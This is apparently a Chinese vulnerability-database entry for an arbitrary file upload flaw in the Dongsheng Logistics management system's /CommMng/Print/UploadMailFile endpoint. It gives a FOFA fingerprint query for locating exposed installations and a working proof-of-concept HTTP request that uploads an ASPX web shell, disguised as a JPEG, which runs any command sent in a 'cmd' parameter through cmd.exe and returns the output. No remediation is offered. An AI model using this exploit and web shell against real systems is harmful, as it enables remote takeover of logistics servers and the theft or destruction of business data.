## 东胜物流-/CommMng/Print/UploadMailFile-文件上传漏洞

## 一、漏洞简介
东胜物流是一款专为物流企业设计的管理系统，提供多种功能以支持物流企业的日常运营。东胜物流系统中的 /CommMng/Print/UploadMailFile 接口存在文件上传漏洞，攻击者可以通过该接口上传恶意文件，可能导致服务器被控制或任意代码执行，对系统构成严重的安全威胁。

## fofa
```
(body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"
```

## POC
```
POST /CommMng/Print/UploadMailFile HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: multipart/form-data; boundary=----Boundary123

------Boundary123
Content-Disposition: form-data; name="LoadFile"; filename="shell.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    string c = Request["cmd"];
    if(c != null){
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
------Boundary123--
```
